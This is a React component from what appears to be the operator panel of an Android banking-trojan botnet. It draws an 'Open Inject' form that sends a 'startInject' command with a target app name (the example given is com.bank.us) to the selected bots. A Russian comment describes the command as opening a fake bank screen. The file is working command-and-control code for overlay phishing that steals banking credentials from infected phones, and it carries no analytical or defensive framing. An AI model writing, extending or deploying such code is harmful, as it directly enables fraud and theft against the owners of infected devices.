import React from 'react';
import SettingsContext from '../../Settings';


//Открыть фейк банка  -  {"this":"~command~","name":"startInject","app":"com.bank.us"}
class OpenInject extends React.Component {

    constructor(props) {
        super(props);
        this.state = {
          app: ''
        }
    }

    onChangeApp = (e) => {
        this.setState({ 
            app: e.target.value
        });
    }

    onClickOpenInject = (e) => {
        if(SettingsContext.BotsSelected()) {
            SettingsContext.BotSendCommand('{"name":"startInject","app":"' + this.state.app + '"}');
            this.setState({ 
                app: ''
            });
            SettingsContext.ShowToastTitle("info", "Open Inject", "Please wait while the bots confirm the command");
        }
    }

    render () {
        return (
            <React.Fragment>
                <div class="card animated fadeIn">
                <div class="card-body">
                    <h5 class="card-title">Open Inject</h5>
                    <h6 class="card-subtitle mb-2 text-muted">Open Inject on selected bots</h6>
                    <p class="card-text">
                        <input class="form-control" value={this.state.app} onChange={this.onChangeApp} placeholder="Inject name" />
                    </p>
                    <button type="button" onClick={this.onClickOpenInject} class="btn btn-right btn-outline-success">Open Inject</button>
                </div>
                </div>
            </React.Fragment>
        );
    }
}

export default OpenInject;